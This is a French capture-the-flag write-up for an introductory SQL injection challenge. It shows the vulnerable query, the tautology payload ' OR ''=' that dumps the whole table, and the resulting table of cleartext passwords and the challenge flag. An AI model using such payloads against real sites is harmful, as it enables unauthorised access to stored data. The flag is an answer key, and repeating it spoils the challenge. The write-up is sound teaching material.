# Writeup - Injection SQL #0: Toute la vérité

En faisant une première requête, on peur voir que le site web nous affiche son texte complet. La requête dans laquelle on injecte est la suivante:

```sql
SELECT * FROM challenge0 WHERE username='NOTRE_INPUT';
```

Comme il s'agit d'un challenge d'injection SQL, on peut présumer que notre entrée n'est pas bien assainie. Essayons donc des caractère spéciaux comme `'`. Nous obtenons une erreur de syntaxe SQL, ce qui signifie que ce que nous entrons n'est pas traité exclusivement comme de la donnée et qu'on peut affecter la sémantique de la requête.

Il serait intéressant de voir tout le contenu de la table `challenge0`. Pour ce faire, il faut injecter quelque chose qui rendra la condition toujours vraie. Par exemple, `' OR ''='` (il faut tenir compte de la requête d'origine. On utilise les `'` de la requête originale pour fermer la première et la dernière chaîne vide). Comme la chaîne de caractères vide sera toujours égale à elle-même et que `x OR True` est toujours vrai, on obtient une tautologie et le site nous montre toutes les entrées de la table

```sql
 -- Requête résultante
SELECT * FROM challenge0 WHERE username='' OR ''='';
```

|Id |Username| Password |
|---|--------|----------|
|1	|test	| PleaseDon'tStorePasswordInCleartextLikeThis|
|2	|admin	| SeriouslyNeverDoThis,It'sBad|
|3	|united | HashPasswordsWithAProperCryptographicHashAndASalt|
|4	|You won't be able to guess my name BSh8dn_fdHs	| The flag: **FLAG-One_SELECT_to_bring_them_all_YbHKhnADUbc**|
